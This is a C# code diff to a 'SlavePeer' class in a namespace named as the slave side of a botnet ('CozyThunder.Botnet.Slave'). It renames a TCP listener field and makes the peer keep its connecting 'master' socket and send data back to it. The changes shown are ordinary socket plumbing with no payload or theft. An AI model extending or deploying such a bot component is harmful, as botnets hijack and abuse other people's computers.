@@ -10,7 +10,8 @@ namespace CozyThunder.Botnet.Slave
     public class SlavePeer : Peer, ISlavePeer
     {
         ISlavePeerListener listener_;
-        TcpListener socket_;
+        TcpListener tcpListener_;
+        Socket master_;
 
         void AcceptCallback(IAsyncResult ar)
         {
@@ -18,6 +19,7 @@ namespace CozyThunder.Botnet.Slave
             {
                 TcpListener listener = (TcpListener)ar.AsyncState;
                 Socket client = listener.EndAcceptSocket(ar);
+                master_ = client;
 
                 listener_?.OnConnect(client.RemoteEndPoint.ToString());
                 StateObject state = new StateObject();
@@ -44,10 +46,10 @@ namespace CozyThunder.Botnet.Slave
             }
             catch
             {
-                socket_.Stop();
-                socket_ = new TcpListener(EndPoint);
-                socket_.Start(1);
-                socket_.BeginAcceptSocket(AcceptCallback, socket_);
+                tcpListener_.Stop();
+                tcpListener_ = new TcpListener(EndPoint);
+                tcpListener_.Start(1);
+                tcpListener_.BeginAcceptSocket(AcceptCallback, tcpListener_);
 
                 listener_?.OnDisConnect();
             }
@@ -63,10 +65,10 @@ namespace CozyThunder.Botnet.Slave
             catch {}
         }
 
-        void Send(Socket handler, String data)
+        public void Send(String data)
         {
             byte[] byteData = Encoding.ASCII.GetBytes(data);
-            handler.BeginSend(byteData, 0, byteData.Length, 0, new AsyncCallback(SendCallback), handler);
+            master_.BeginSend(byteData, 0, byteData.Length, 0, new AsyncCallback(SendCallback), master_);
         }
 
         public bool Start(string ip, int port, ISlavePeerListener listener)
@@ -76,9 +78,9 @@ namespace CozyThunder.Botnet.Slave
 
             try
             {
-                socket_ = new TcpListener(EndPoint);
-                socket_.Start(1);
-                socket_.BeginAcceptSocket(AcceptCallback, socket_);
+                tcpListener_ = new TcpListener(EndPoint);
+                tcpListener_.Start(1);
+                tcpListener_.BeginAcceptSocket(AcceptCallback, tcpListener_);
             }
             catch (SocketException)
             {
@@ -89,7 +91,7 @@ namespace CozyThunder.Botnet.Slave
 
         public bool Stop()
         {
-            socket_.Stop();
+            tcpListener_.Stop();
             return true;
         }
     }
